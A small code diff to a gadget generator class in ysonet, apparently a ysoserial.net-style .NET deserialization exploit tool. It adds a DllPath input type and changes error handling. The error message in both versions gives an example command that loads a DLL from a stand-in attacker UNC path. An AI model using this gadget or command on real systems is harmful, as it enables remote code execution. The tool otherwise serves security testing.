@@ -26,6 +26,11 @@ namespace ysonet.Generators
             return "Gadget for .NET 5/6/7 with WPF enabled or Microsoft.WindowsDesktop.App\\PresentationFramework.dll available. Leads to remote DLL loading (native C/C++ DLL)";
         }
 
+        public override CommandInputType CommandInput()
+        {
+            return CommandInputType.DllPath;
+        }
+
         public override List<string> Labels()
         {
             return new List<string> { GadgetTags.Independent, ".NET 5/6/7", "Requires WPF enabled or PresentationFramework.dll" };
@@ -40,8 +45,7 @@ namespace ysonet.Generators
 
             if (!inputArgs.CmdFullString.ToLowerInvariant().EndsWith(".dll"))
             {
-                Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your DLL file\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nThis gadget can only load files with DLL extension, as .dll extension will be added to the path during the deserialization\r\nExample: ysonet.exe -g BaseActivationFactory -f Json.NET -c '\\\\attacker\\poc\\your.dll'");
-                Environment.Exit(-1);
+                throw new Exception("This gadget loads remote/local file: -c argument should provide a file path to your DLL file\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nThis gadget can only load files with DLL extension, as .dll extension will be added to the path during the deserialization\r\nExample: ysonet.exe -g BaseActivationFactory -f Json.NET -c '\\\\attacker\\poc\\your.dll'");
             }
 
             if (formatter.ToLower().Equals("json.net"))
